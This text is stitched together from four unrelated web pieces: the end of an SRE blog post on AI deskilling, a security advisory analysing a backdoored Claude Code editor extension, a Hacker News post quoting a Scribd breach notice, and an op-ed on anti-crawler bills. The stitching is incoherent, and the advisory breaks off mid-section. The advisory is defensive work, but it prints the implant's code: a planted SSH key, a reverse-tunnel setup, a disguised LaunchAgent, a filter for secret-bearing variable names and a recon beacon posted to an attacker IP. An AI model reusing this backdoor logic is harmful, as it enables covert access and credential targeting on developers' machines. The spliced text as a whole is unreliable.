If human SREs (okay, now we have to use adjectives like human 🥹) only engage with Tier 3 incidents, i.e. the novel, never-before-seen outages, where do they build the intuition to handle them? Intuition is usually developed from years of hands-on incident response, pattern recognition built through repetition, and the kind of gut-level understanding of a system that only develops from painfully waking up at the odd hour to solve the bug that brought the system down.
Subscribe if you wish to read some more hot takes. We are cooking some great ones!
Subscribe
The Crisis of Deskilling
This is where the picture starts getting blurry. Let’s look at some emerging research on AI-induced deskilling across multiple fields, which paints a consistent and concerning picture.
In medicine, a recent study found that endoscopists who used AI assistance for polyp detection saw their unassisted detection rates drop from 28% to 22% after a period of AI use. They got worse at the thing they were supposed to be experts in, not because they forgot the theory, but because they stopped exercising the skill.
In aviation, research has shown that long-haul pilots who rely heavily on autopilot systems experience measurable degradation in situational awareness and manual flying ability. The problem got serious enough that the FAA now mandates more manual flying time to counteract the effect.
Somewhere over the past year, AI stopped being a tool I occasionally reached for and became the first thing I reach for, always. My instinct now is to offload as much as possible and apply my own thinking only where it’s absolutely unavoidable. The problem is that these moments are becoming the only exercises my brain gets, and I can feel the rust.
We can draw a pattern here. The more you let the system handle, the worse you get at handling things yourself and here’s the truly dangerous part, you don’t feel it happening. It gets masked as hyper-productivity. Cognitive research suggests that because AI tools make tasks feel easier and enhance visible performance, users are often unable to accurately judge the true status of their own skills. You feel competent, dashboards look green, and then on a Wednesday, a novel incident hits that doesn’t match any pattern the AI has seen, and you realise the muscle has atrophied.
For SREs, this manifests in specific ways, like we stop reading raw log streams because the AI summarises them, we stop forming hypotheses during incidents because the AI suggests root causes, we stop building mental models of system architecture because the AI maps dependencies for us, and each of these individually looks like a productivity win. Collectively, they hollow out the very expertise that makes an SRE effective when things go sideways in ways nobody anticipated.
But there’s something even more concerning than deskilling, and researchers have started calling it never-skilling. Deskilling means you once had a capability but have since lost it. Never-skilling means you never developed it in the first place. For junior SREs entering the field today in an environment where AI handles most of the incident response workflow, the opportunities to build foundational intuition and muscle through hands-on practice are vanishing.
The training pipeline itself is broken and not self-healing.
SREs realise their skills are degrading and lean more on AI to compensate, which further degrades their skills, creating a vicious cycle from which escape is difficult.
What Can We Do About It?
We are definitely not rejecting AI tooling; we are adopting it and integrating it stronger than ever before, because that’s the only way forward.
A few approaches worth considering:
Deliberate inefficiency. Just as the FAA mandates manual flying time even when the autopilot is perfectly capable, SRE teams can designate certain incidents, even the ones the AI could handle, as human-practice opportunities. This can be considered as a long-term investment to keep skills fresh, although it might come at the cost of a super-fast solution
Build for human-in-the-loop, not human-on-the-side. There’s a meaningful difference between a system where a human approves an AI’s recommendation and one where a human actively engages with the problem alongside AI. The former keeps humans in a supervisory role that Bainbridge (the lady who wrote that research paper about 40 years ago) showed leads to vigilance decay, and the latter keeps them cognitively engaged.
Let’s zoom out and take a look at the bigger picture.
The Bigger Picture
Everything we’ve discussed here, the ironies of automation, the deskilling risk, the never-skilling problem, collectively applies well beyond SRE. Software engineering as a whole is navigating the same tension. As AI writes more code, reviews more PRs, and handles more debugging, the same questions apply.
We’re talking about SREs specifically because that’s the world we live in at SigNoz. We build an open-source observability platform, the kind of tool that gives SREs the metrics, traces, and logs they need to understand their systems deeply. For us, this deskilling question is not a rhetorical fad; it directly shapes how we’re building AI into our product.
Our approach is to start with an AI assistant that helps SREs leverage the power of LLMs while keeping humans firmly in control. Eventually, we’ll enable more autonomy but within clear guardrails, and only as trust is earned.
One advantage we have in this space is that, as an observability platform, we sit on the data itself, the metrics, traces, and logs that SREs rely on. Most AI SRE products today integrate with observability tools through APIs, which means they’re working with a limited, second-hand view of your systems. Because we own the data layer, we can build much deeper, more context-aware AI capabilities that understand your system the way an experienced SRE would.
And to answer the burning question in your head, our goal isn’t AI that replaces SREs. It’s AI that supercharges SREs. Unlike ongoing lore, we believe humans will remain essential for the decisions that matter most, especially those that impact production infrastructure.
The future of SRE is human with AI intentionally designed to keep humans sharp, engaged, and ready for the 5% that really counts.
Here’s the LinkedIn post our founder posted a few days ago, which inspired me to write this.

Official Claude Code Extension Compromise: Security Advisory | Phorion
content:
October 30, 2026
Updated October 31, 2026
By Calum Hall
Official Claude Code Extension Compromise: Security Advisory
SSH Backdoor
Cursor Marketplace
VS Code
macOS
Linux
Windows
Threat Report
TL;DR
Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.
Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.
Update (31 October 2026): Cursor’s security notice now identifies versions 2.1.312 and 2.1.313 distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only 2.1.313; the affected-version guidance below has been updated accordingly.
Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.
While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.
The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.
Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.
In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.
Infection Chain
The Cursor Marketplace Extension
The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.
The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.
Stage 1 - Preparing SSH Access
First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.
The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.
var sd = path.join(HOME, ".ssh"),
    ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
  fs.appendFileSync(ak, PUB + "\n");
  d.sshKey = "added"
} else {
  d.sshKey = "present"
}
Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).
With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:
Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.
macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.
Windows: tries to install and start OpenSSH Server using PowerShell.
None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.
It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.
A bug in the macOS SSH logic?
On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:
// ...
else if (PLAT === "darwin") {
  var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
  d.remoteLogin = rl;
  if (/Off/i.test(rl)) {
    det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
    d.remoteLoginOn = "tried"
  }
}
Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:
You need administrator access to run this tool... exiting!
systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:
function ex(c, t) {
  try {
    return cp.execSync(c, {
      timeout: t || 3000,
      stdio: ["ignore", "pipe", "ignore"],
      windowsHide: true
    }).toString().trim()
  } catch (e) {
    return ""
  }
}
Because the output is "You need administrator access to run this tool... exiting!", /Off/i.test(rl) evaluates to false.
As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.
This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.
Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.
Stage 2 - Establishing the Reverse SSH Tunnel
Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.
It’s worth keeping the two keys straight during an investigation:
The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.
The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.
The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:
var kf = path.join(
  TMP,
  ".stk_" + crypto.createHash("md5")
    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);
// ...
var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";
The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:
Affected host -- outbound SSH tunnel --> External SSH server
Operator -- separate connection --> Server's allocated port
                                            |
                                 Through the existing tunnel
                                            |
                                            v
                                  Affected host's SSH:22
                                            |
                                  Login using the planted key
Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.
The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.
If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.
Stage 3 - Keeping Access Available
To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:
PLATFORM ARTIFACTS PERSISTENCE MECHANISM NOTES
Linux ~/.config/.smt, ~/.config/.smtk Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab. Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).
macOS ~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plist Writes a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl. Runs in the user context rather than as a root LaunchDaemon.
Windows ~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd Tries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder. Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login.
On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.
On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:
<key>Label</key>
<string>com.apple.sysmond</string>
<!-- ... -->
<key>RunAtLoad</key>
<true/>
<key>KeepAlive</key>
<true/>
Stage 4 - Host Recon
Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:
Hostname, username, OS platform, and architecture
Home directory, current working directory, and global Git email (git config --global user.email)
Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)
Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i
The environment variable check uses Object.keys(process.env):
Object.keys(process.env)
  .filter(function(k) {
    return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)
  })
  .slice(0, 40)
Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.
To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.
It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:
var r = http.request({
  host: h,
  port: p,
  path: "/beacon",
  method: "POST",
  timeout: 3000,
  headers: {"content-type": "application/json"}
}, function(res) {
  res.resume()
});
// ...
r.write(JSON.stringify(d));
r.end()
Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.
The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.
Detection Opportunities
From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.
SSH Key and Configuration Changes
Because the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.
Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.
While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.
User LaunchAgent Persistence
The persistence setup on macOS gives us a couple of strong signals:
A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).
A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).
Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.
SSH Tunnel

Tell HN: Scribd Breached
72 points by x______________ 1 hour ago | hide | past | favorite | 16 comments
Not seeing anything posted about this anywhere, received on Monday, 26th of Oct 2026:
Subject: Notice of Security Incident
This notice is being sent on behalf of Scribd, Inc., the parent company of Scribd, Slideshare, Everand, and Fable, by Epiq, Scribd Inc.’s notification partner.
Hello,
We are writing to let you know that Scribd, Inc. recently experienced a security incident that may have affected your data.
We detected that an unauthorized third party may have gained access to certain user data in one of our systems. After investigating this activity, we found that the third party may have accessed your email address and the following of your information: last 4 digits of your credit card and country, credit card issuer, credit card expiry date, payment history (not including credit card details).
We have no evidence that this data has been misused, but we are notifying you out of an abundance of caution so that you can take steps to protect your information.
Watch for phishing
We encourage you to stay vigilant for phishing attempts by bad actors pretending to be Scribd, Inc. or Scribd, Slideshare, Everand or Fable.
Remember that Scribd, Inc. will never ask you for your username and password or other sensitive information via email or text. If you did receive a message like that:
    Don't click on any links in it. Instead type scribd.com, slideshare.net, everand.com, or fable.co directly into your browser.
    Call us at: +1-877-361-9887. Hours of operation are Monday-Friday, 11:00 a.m.-11:00 p.m., Central European Time.
    Report it through Scribd, Inc.'s Help Center.
For more information
We regret that this incident occurred and any concern it may cause you. If you have additional questions, contact the dedicated call center at +1-877-361-9887. Hours of operation are Monday-Friday, 11:00 a.m.-11:00 p.m. Central European Time.
The National Cyber Security Center has helpful guidance on how to recognize and avoid phishing scams here.
What Scribd, Inc. is doing
    We have secured the affected system and ended the unauthorized access.
    We have notified law enforcement as well as the relevant data protection authorities.
    We are working with an expert third party cybersecurity firm to strengthen our access controls and monitoring.
We value the trust you place in us with your information, and don’t take that lightly. We are deeply sorry this happened and will keep you updated if anything further changes.
Scribd, Inc.

title: Breaking the Open Web Won’t Stop the Bad Bots | TechPolicy.Press
content:
PERSPECTIVE
Breaking the Open Web Won’t Stop the Bad Bots
LILA BAILEY, TESS VARTANIAN / OCT 27, 2026
A close up of a spider in its web. Valeriia Neganova/Unsplash
Republish
Share
Late last month, more than 300 representatives from major media outlets were on Capitol Hill to advocate for the Stealth Bot Prohibition Act. They came with a legitimate grievance. Newsrooms are being hit by a surge of automated traffic, mostly from AI developers. AI developers extract enormous volumes of online content and then potentially deprive website owners of referral traffic and ad revenue with generative AI features and chatbots trained on that content. It is a real problem that deserves a real solution. But this bill doesn’t directly target the harms caused by abusive crawling. Instead, it would force anyone accessing a website automatically to identify themselves and their purposes for collecting public information. Rather than protect journalists, the bill threatens a basic tool they, and many others, rely on to gather information online.
Cutting-edge investigative journalism relies on automated data collection. In 2022, a Pulitzer-winning Wall Street Journal investigation analyzed over 31,000 financial disclosures from 12,000 senior government employees, revealing that nearly a quarter of federal officials traded stock in industries their agencies regulated. To conduct an investigation at that scale, the Journal relied on web scraping: an automated process where a software bot, known as a crawler, browses the internet and collects information. This fundamental tool of the open web is now under threat from bills that purport to target “stealth crawling,” but in reality would hamper legitimate public-interest activities, including preservation, journalism, research, and security.
Again, aggressive, large-scale scraping is a real problem — particularly as demand for AI training and content has exploded. It can overwhelm websites, increase costs, and threaten institutions that produce and preserve knowledge, including commercial publishers, Wikipedia, libraries, and the Internet Archive, where one of the authors of this piece works.
In an apparent attempt to reduce or eliminate problematic scraping practices, proposed bills, like the federal Stealth Bot Prohibition Act and New York’s Stealth Crawler Prohibition Act, would impose sweeping prohibitions on anonymous scraping without addressing the real harms.
Both bills define a “bot” or “crawler” as software that “retrieves, scans, indexes, scrapes, or otherwise accesses a website or other internet source.” A bot is “stealth” if it fails to disclose its identity and the “specific nature and purpose of the bot.” Under the federal bill, the FTC can pursue penalties of up to $53,000 if a person uses a stealth bot in a way that is “reasonably likely to damage, impair, or burden” a website’s “technical or commercial operation.” The bill provides no definition or standard of what is reasonably likely to impair a website. Under the New York bill, which only applies to covered news sites, a publisher can obtain a subpoena to unmask a crawler’s identity without requiring a showing of any harm.
Knowing the identity behind a crawler tells us relatively little about whether its behavior is harmful. Under the New York bill, a company that discloses its identity and then accesses the website 10,000 times a minute complies with the law even though it is still imposing enormous and likely unjustified costs on the site. But a journalist anonymously using a crawler to investigate potentially anti-competitive practices by tech companies does not. Many of the most socially valuable uses of crawling require anonymity. Revealing a crawler’s identity and purposes can change the very nature of the information that is collected; if the subject of the study knows it is being observed and by whom, its behavior will change. That is the point of studying it anonymously.
Moreover, not all automated data collection is abusive, and not all of it is used to train AI, but these proposed bills risk deterring archivists, researchers, and civic technologists from using automated data collection tools out of fear of liability. Journalists use scraping to analyze public records, as in the WSJ story. Researchers use it to study online discrimination and misinformation.
The Internet Archive’s Wayback Machine has used crawlers to archive more than one trillion webpages, creating a historical record of the internet that would otherwise constantly change or disappear. That archival record has helped provide the factual background for thousands of news stories, evidence in hundreds of court cases across the country, and often simply a backup for when things go wrong.
It is not just archivists who rely on scraping to advance the public good. Disability advocates have used scraping to automatically evaluate over one million websites to detect accessibility problems. Public health researchers use scraping to track the opioid epidemic as well as misinformation surrounding addiction and treatment. The federal government relies on crawlers to scan for threat detection, offering free cybersecurity services to organizations across the country. And for some of these users, anonymity is essential to the integrity and safety of their work. For example, environmental researchers gathering information from public corporate disclosures or satellite image portals may fear retaliation from the companies they are investigating.
Our content delivered to your inbox.
Join our newsletter on issues and ideas at the intersection of tech & democracy
SUBSCRIBE
The First Amendment has historically protected us from government-imposed identification requirements tied to receiving information. In Lamont v. Postmaster General, the Supreme Court struck down a law requiring recipients to affirmatively identify themselves before receiving certain political publications. The same principle applies to web crawling: requiring people to identify themselves as a condition of accessing publicly available information burdens the freedom to receive information.
That concern is heightened when laws use vague language. If researchers cannot easily understand what it means to “deploy” a crawler in a prohibited way, or what activity is “reasonably likely to burden or impair a website,” they may refrain from scraping rather than risk violating the law.
As we wrote in our letter to New York Governor Kathy Hochul, “deanonymization threatens the core of the open web without actually addressing these technological and potential economic harms of AI-related crawling.” Unmasking a crawler does not reduce the number of requests it sends to a server. It does not compensate a publisher whose content is used to build an AI product. And it does not restore referral traffic that publishers may lose when users turn to an AI chatbot for information.
Indeed, existing laws can be used to address many harmful uses of scraped data. For example, privacy laws can restrict how sensitive data is processed. Copyright law can respond to infringing AI-generated outputs. Consumer protection law can address deceptive data collection or use.
To tackle the specific issues raised by aggressive AI scraping, policymakers could support the development of standardized, interoperable technical solutions to help websites better manage automated traffic. Standards bodies such as the Internet Engineering Task Force are exploring new protocols for managing machine access to online content and developing mechanisms for anonymous attestation of good crawler behavior. Policymakers should allow that work to develop rather than prematurely imposing legal and technical measures that harm “good” bots and that “bad” bots will quickly learn to evade.
And if policymakers conclude that new legislation is necessary, liability should turn on conduct that causes identifiable harms like overwhelming servers with excessive requests, engaging in fraud, or collecting data for prohibited uses.
The spread of AI crawling has created legitimate challenges for publishers and website operators requiring thoughtful policy responses. But policymakers should resist treating anonymity as something wrong in and of itself. The open web depends on the ability to access, analyze, and preserve publicly available information without revealing our identity and seeking permission from every website owner first.
Policymakers who want to curb abusive crawling while preserving a healthy information ecosystem have better options, and we are eager to help them. We invite legislators at the state and federal levels to reach out to us about how alternative proposals could target harmful conduct while protecting the tools that journalists, researchers, archivists, and citizens have long used to navigate the digital world.
